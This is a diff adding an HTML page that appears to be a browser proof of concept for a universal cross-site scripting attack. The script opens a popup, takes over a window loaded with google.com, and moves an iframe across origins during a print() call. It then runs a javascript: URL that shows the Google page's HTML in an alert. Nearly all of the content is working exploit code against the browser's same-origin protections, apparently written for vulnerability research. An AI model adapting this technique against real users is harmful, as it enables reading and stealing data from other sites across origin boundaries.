@@ -1,0 +1,40 @@
+<body> <h1>Click anywhere on the screen to start</h1> <script> if (location.protocol == "file:") { alert("This page needs to be served over HTTP"); throw 1; }
+runAsync = func => chrome.runtime.sendMessage("a", "", {}, func);
+waitForWindow = (window, accessible, func) => {
+var doc;
+try { doc = window.document } catch (e) { }
+accessible == !!doc ? func() : runAsync(waitForWindow.bind(null, window, accessible, func));
+}
+
+if (location.search != "?popup") {
+document.onclick = () => open(location + "?popup");
+} else {
+opener.name = "remoteWindow";
+remoteWindow = open("https://www.google.com/", "remoteWindow");
+
+waitForWindow(remoteWindow, false, () => {  
+    frame = document.body.appendChild(document.createElement("iframe"));  
+    frame.srcdoc = "**<p><iframe src='javascript:top.frameLoaded(frameElement)'></iframe><iframe></iframe>** </p>"  
+
+    frameLoaded = childFrame => {  
+        if (targetFrame = childFrame.nextSibling) {  
+            runAsync(() => {  
+                remoteWindow.location = "about:blank";  
+                  
+                waitForWindow(remoteWindow, true, () => {  
+                    remoteWindow.document.body.appendChild(targetFrame);  
+                    targetFrame.src = "https://www.google.com/services/";  
+                    waitForWindow(targetFrame.contentWindow, false, () => {  
+                        targetFrame.src = "javascript:alert(document.documentElement.innerHTML)";  
+                        close();  
+                    });  
+                });  
+            });  
+            print();  
+        }  
+    }  
+});  
+};
+</script>
+
+</body>
